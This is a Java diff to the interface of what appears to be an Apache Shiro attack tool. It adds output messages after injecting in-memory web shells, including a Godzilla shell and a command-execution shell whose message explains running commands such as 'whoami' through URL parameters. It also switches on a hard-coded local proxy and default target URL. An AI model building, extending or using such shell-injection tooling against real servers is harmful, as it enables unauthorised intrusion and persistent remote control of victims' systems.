@@ -127,9 +127,9 @@ public class ShiroController {
         // 设置
         this.initToolbar();
 
-        // InetSocketAddress proxyAddr = new InetSocketAddress("127.0.0.1", 8083);
-        // proxySettingInfo.put("proxy", new Proxy(Proxy.Type.HTTP, proxyAddr));
-        // urlInput.setText("http://127.0.0.1:8080/");
+        InetSocketAddress proxyAddr = new InetSocketAddress("127.0.0.1", 8083);
+        proxySettingInfo.put("proxy", new Proxy(Proxy.Type.HTTP, proxyAddr));
+        urlInput.setText("http://127.0.0.1:8080/");
         // System.out.println(CustomLoader.loaderCodeWithSecondWay);
     }
 
@@ -433,12 +433,18 @@ public class ShiroController {
         Thread thread = new Thread(() -> {
             String result = ShiroAttack.injectMemShell(tmpUrl, cookieFlag, key, chain, memShell, path, password);
             Platform.runLater(() -> {
-                if (result.contains("注入失败"))
+                if (result.contains("注入失败")) {
                     memShellInjectInfo.appendText(result + "\n\n");
-                else if (memShell.contains("哥斯拉"))
-                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + result + "  密码："+password+" 密钥：key\n\n");
-                else
-                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + result + "  密码："+password+"\n\n");
+                } else if (memShell.contains("哥斯拉")) {
+                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + result + "  密码：" + password + " 密钥：key\n\n");
+                } else if (memShell.contains("命令执行")) {
+                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功： " + tmpUrl + "?name=&user=whoami \n" +
+                            "【可选】 type参数：设置响应编码 (utf-8 | gbk)\n" +
+                            "【可选】 base参数: 默认不填，存在则需要将 user参数 的值用base64编码\n" +
+                            " POST请求时，修改请求头：Content-Type: application/x-www-form-urlencoded \n\n");
+                } else {
+                    memShellInjectInfo.appendText("【+】 " + memShell + " 内存马注入成功：" + result + "  密码：" + password + "\n\n");
+                }
             });
         });
         thread.start();
